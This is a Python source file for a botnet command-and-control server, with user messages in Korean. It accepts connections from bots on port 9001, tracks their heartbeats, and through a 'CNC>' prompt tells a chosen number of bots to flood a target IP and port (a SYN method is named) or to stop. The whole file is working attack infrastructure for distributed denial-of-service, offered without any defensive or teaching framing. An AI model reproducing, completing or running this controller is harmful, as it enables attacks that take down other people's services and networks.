import socket, threading, time
from datetime import datetime
import sys

bots = {}

def client_handler(conn, addr):
    ip = addr[0]
    bots[ip] = {"sock": conn, "connected_at": datetime.now(), "last_heartbeat": datetime.now()}
    try:
        while True:
            data = conn.recv(1024).decode()
            if data == "heartbeat":
                bots[ip]["last_heartbeat"] = datetime.now()
            elif data.startswith("done"):
                print(f"[DONE] {ip} -> {data}")
    except:
        pass
    finally:
        bots.pop(ip, None)
        conn.close()

def start_server():
    s = socket.socket()
    s.bind(('0.0.0.0', 9001))
    s.listen()
    print("C&C listening on port 9001...")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=client_handler, args=(conn, addr), daemon=True).start()

def send_attack(method, ip, port, bot_count):
    for bot in list(bots.values())[:bot_count]:
        cmd = f"attack {method} {ip} {port}"
        try:
            bot["sock"].send(cmd.encode())
        except:
            continue

def send_stop(bot_count):
    for bot in list(bots.values())[:bot_count]:
        try:
            bot["sock"].send(b"stop")
        except:
            continue

if __name__ == "__main__":
    threading.Thread(target=start_server, daemon=True).start()
    while True:
        try:
            cmd = input("CNC> ").strip()
            if cmd == "":
                continue
            elif cmd.lower() == "exit":
                print("서버를 종료합니다.")
                sys.exit(0)
            elif cmd.startswith("attack"):
                parts = cmd.strip().split()
                # attack syn <ip> <port> <bot_count>
                # attack <method> <ip> <port> <bot_count>
                if len(parts) == 5 and parts[1] == "syn":
                    _, method, ip, port, count = parts
                    try:
                        send_attack(method, ip, int(port), int(count))
                    except Exception as e:
                        print(f"명령 처리 중 오류: {e}")
                        continue
                elif len(parts) == 5:
                    _, method, ip, port, count = parts
                    try:
                        send_attack(method, ip, int(port), int(count))
                    except Exception as e:
                        print(f"명령 처리 중 오류: {e}")
                        continue
                else:
                    print("명령 형식 오류! 사용법: \n"
                          "  attack <method> <ip> <port> <bot_count>\n"
                          "  attack syn <ip> <port> <bot_count>")
                    continue
            elif cmd.startswith("stop"):
                parts = cmd.strip().split()
                if len(parts) == 2:
                    _, count = parts
                    try:
                        send_stop(int(count))
                    except Exception as e:
                        print(f"명령 처리 중 오류: {e}")
                        continue
                else:
                    print("명령 형식 오류! 사용법: stop <bot_count>")
                    continue
            elif cmd == "status":
                print(f"Connected bots: {len(bots)}")
                for ip, info in bots.items():
                    print(f"{ip} | connected at {info['connected_at']}")
            else:
                print("알 수 없는 명령입니다. 사용 가능한 명령어:\n"
                      "  status\n"
                      "  attack <method> <ip> <port> <bot_count>\n"
                      "  attack syn <ip> <port> <bot_count>\n"
                      "  stop <bot_count>\n"
                      "  exit (서버 종료)")
        except KeyboardInterrupt:
            print("\n서버를 종료합니다.")
            sys.exit(0)
